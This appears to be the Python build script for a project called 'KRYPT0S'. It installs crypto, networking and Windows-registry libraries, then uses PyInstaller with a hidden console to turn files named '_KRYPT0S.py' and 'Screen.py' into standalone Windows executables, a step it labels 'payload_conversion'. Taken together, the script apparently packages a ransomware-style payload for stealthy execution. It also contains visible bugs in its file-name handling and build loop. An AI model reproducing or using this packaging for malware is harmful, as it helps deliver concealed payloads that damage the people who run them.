import subprocess, os 
import shutil

# Development message
print("THIS IS STILL IN DEVELOPMENT AND WILL PROBABLY NOT WORK IN THE MEANTIME, this will be completed soon! - The developer :)")
try:
    input("Press any key to continue with the installation, use ctrl+c to cancel and exit . . .")
except KeyboardInterrupt:
    exit()

def parse_pip_output(pip_output, library_name):
    if "Successfully installed" in pip_output:
        return f"[+] Successfully installed {library_name}!"
    elif "Requirement already satisfied" in pip_output:
        return f"[!] Library {library_name} already installed."
    elif "Defaulting to user installation because normal site-packages is not writeable" in pip_output:
        return f"[!] {library_name} installed in user site-packages due to permission issues."
    else:
        return f"[-] Unable to parse PIP output for {library_name}. The below snippet log was captured : {pip_output[:40]}"

def check_os():
    if os.name != 'nt':
        print("[-] OS ERROR")
        print("You are not running a Windows OS.")
        print("Converting a .py to a .exe file from a non-Windows OS will result in creating an executable for that system.")
        print("This is not a script limitation but a general limitation found in all conversion systems.")
        print("To run this successfully, ensure the OS you are running this script on is a Windows machine.")
        print("This will ensure the conversion will work and the .py file will change to a .exe file.")
        
        exit()
        
    print("[✔] Running windows OS")
    
def download_library(libraries):
    print("[*] Checking and downloading required PIP libraries")
    for library in libraries:
        command = ["pip", "install", library]
        try:
            result = subprocess.run(command, capture_output=True, text=True)
            if result.stdout or result.stderr: 
                output = parse_pip_output(result.stdout, library)
                print(output)
            else:
                print(f"No output available for {library}.")
        except Exception as err:
            print(f"[-] Unable to install {library}! Error: {err}. Skipping...")
            
def libraries_check_section(libraries):
    print("PIP LIBRARY INSTALLATION - Downloading required libraries . . . \n")

    download_library(libraries)

    print("\nLIBRARY INSTALLATION COMPLETED")

def payload_conversion():
    names = ["_KRYPT0S.py", "Screen.py"]
    
    try:
        os.mkdir("krytp0s output conversion")
    except FileExistsError:
        pass
    except:
        exit("Error when creating output file. Please create a file named 'krytp0s output conversion' manually in the same directory to bypass this problem.")
    
    try:
        os.chdir("krytp0s output conversion")
    except FileNotFoundError:
        exit("Unable to find 'krytp0s output conversion' folder, ensure it has been created and is found in this directory before continuing.")
    except Exception as err:
        exit(f"An unknown system error occured when trying to traverse a path : {err}")
    
    file_name = "KRYPT0S" # Default name
    file_name = input("Enter a custom name for the executable file of _KRYPT0S.py -> ")
    if ".exe" in file_name: file_name = file_name.rstrip('.exe')
        
    for name in names:
        if name == "Screen.py": file_name = "Screen"
        command = [
            "pyinstaller",
            "--onefile",
            "--name",
            file_name,
            "--noconsole",
            f"../_KRYPT0S_f1les/{name}"
        ]

        print(f"[!] Processing the conversion of '{file_name}'. Please stand by, this may take some time.")
        result = subprocess.run(command, capture_output=True, text=True, shell=True)
    
        if result.returncode == 0:
            print(f"[+] File {name} has been converted to {file_name}.exe.")
        else:
            exit(f"[-] A fatal error occurred: {result.stderr}. Please try again later")
            
        os.chdir("..") # Traverse a directory back
        break
    
    print("[*] Conversion Completed. Please check the 'krytp0s output conversion' folder to view the output")

def banner():
    print("""
         _  ________   _______ ____   ___  ____    ____  _____ _____ _   _ ____  
        | |/ /  _ \ \ / /_   _|  _ \ / _ \/ ___|  / ___|| ____|_   _| | | |  _ \ 
        | ' /| |_) \ V /  | | | |_) | | | \___ \  \___ \|  _|   | | | | | | |_) |
        | . \|  _ < | |   | | |  __/| |_| |___) |  ___) | |___  | | | |_| |  __/ 
     ___|_|\_\_| \_\|_|   |_| |_|    \___/|____/  |____/|_____| |_|  \___/|_|      
    """)

def delete_unwanted_files():
    pass

banner()    
check_os()

libraries = ["pycryptodome", "requests", "pywin32", "winreg"]
# libraries_check_section(libraries)

payload_conversion()